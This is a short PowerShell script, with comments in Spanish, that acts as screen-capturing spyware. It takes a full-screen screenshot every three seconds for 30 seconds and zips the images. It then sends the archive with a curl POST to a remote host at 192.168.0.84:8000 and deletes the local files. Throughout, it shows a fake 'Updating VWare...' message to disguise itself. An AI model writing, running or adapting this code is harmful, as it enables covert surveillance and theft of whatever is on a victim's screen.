Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$totalTime = 30  # Duración total en segundos
$interval = 3    # Intervalo entre capturas en segundos
$numberOfCaptures = $totalTime / $interval

Write-Host "Updating VWare..."

$destinationUrl = "http://192.168.0.84:8000/"
$outputDir = "$env:TEMP\Collection\"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir
}

for ($i = 0; $i -lt $numberOfCaptures; $i++) {
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = Join-Path $outputDir ("Captura_$timestamp.png")
    $bitmap.Save($outputFile)
    $graphic.Dispose()
    $bitmap.Dispose()
    Start-Sleep -Seconds $interval
}
$zipFilePath = "$env:TEMP\collection.zip"
[IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
Start-Sleep 20

curl.exe -X POST -F "file=@$zipFilePath" $destinationUrl

Start-Sleep 4
Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
Remove-Item -Path $zipFilePath -Force
